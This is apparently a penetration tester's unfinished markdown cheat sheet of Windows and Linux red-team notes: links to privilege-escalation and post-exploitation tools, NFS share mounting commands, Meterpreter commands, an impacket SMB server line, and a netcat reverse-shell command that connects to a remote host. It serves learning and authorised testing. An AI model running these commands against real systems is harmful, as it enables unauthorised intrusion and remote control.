---
description: 'Sorted Linux notes, need to separate to different pages and reorganize'
---

# Red Team Notes

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

living off the land binaries: [LOLBAS](https://lolbas-project.github.io/)

## Enumeration

Windows Privilege Escalation Enumeration Script: [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Little bit o' everything: [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)

## Shares

### Mounting NFS Shares Remotely

{% embed url="https://resources.infosecinstitute.com/exploiting-nfs-share/" %}

```text
showmount -e <ip>
<list of mounts>
mkdir /tmp/<foldername?
mount -t nfs <ip>:/<mount-folder> /tmp/<foldername>
```

## Unsorted

Netcat reverse shell \(after uploading the binary!\): `nc64.exe -e cmd <ip port>`

5KFB6 tools: [https://specterops.io/resources/research-and-development](https://specterops.io/resources/research-and-development)

easy windows shell: unicorn.py [trustedsec/unicorn](https://github.com/trustedsec/unicorn) [HackTheBox - Arctic](https://www.youtube.com/watch?v=e9lVyFH7-4o)

system information: `sysinfo`

Get user id: `getuid`

Powershell privilege escalation:

* [PowerUp.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) from PowerShellEmpire
* Sherlock.ps1

[fuzzbunch](https://github.com/peterpt/fuzzbunch): exploit tool similar to metasploit

check what updates are installed: `type WindowsUpdate.log`

net use share from linux \[like SimpleHTTPServer for Samba\]: `impacket-smbserver <sharename> '<dir_to_share>'`

